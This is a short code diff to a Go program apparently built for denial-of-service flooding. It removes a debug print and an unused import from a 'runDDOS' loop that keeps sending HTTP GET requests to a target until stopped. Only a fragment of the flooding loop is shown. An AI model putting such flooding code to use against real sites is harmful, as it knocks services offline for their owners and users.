@@ -2,7 +2,6 @@ package main
 
 import (
 	"io"
-	"fmt"
 	"io/ioutil"
 	"net/http"
 )
@@ -40,7 +39,6 @@ func runDDOS(ddos *DDOS) {
 		case <-ddos.stopped:
 			return
 		default:
-			fmt.Println("1")
 			resp, err := http.Get(ddos.target)
 			if err != nil {
 				continue
